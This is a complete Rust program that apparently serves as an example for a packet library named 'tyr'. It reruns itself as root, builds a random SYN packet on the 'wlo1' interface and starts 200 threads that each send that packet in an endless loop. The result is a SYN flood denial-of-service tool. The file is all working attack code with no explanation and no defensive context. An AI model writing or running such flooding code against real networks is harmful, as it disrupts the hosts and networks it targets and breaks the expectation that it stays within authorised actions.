use pnet::datalink;
use tyr::error::Error;
use tyr::payload::Payload;

fn main() -> Result<(), Error> {
    tyr::rerun_if_not_root()?;

    let interface = tyr::interface::get_interface("wlo1").ok_or(Error::InterfaceNotFound)?;

    let mut payload = tyr::payload::syn::SYNPayload::random(&interface);
    let mut packet = [0u8; 52];
    payload.build(&mut packet)?;

    let mut handles = vec![];
    for _ in 0..200 {
        let interface = interface.clone();
        if let datalink::Channel::Ethernet(mut tx, _) =
            datalink::channel(&interface, Default::default())?
        {
            let handle: std::thread::JoinHandle<Result<(), Error>> =
                std::thread::spawn(move || loop {
                    tx.send_to(&packet, Some(interface.clone())).unwrap()?;
                });
            handles.push(handle);
        };
    }

    for handle in handles {
        handle.join().unwrap()?;
    }

    Ok(())
}
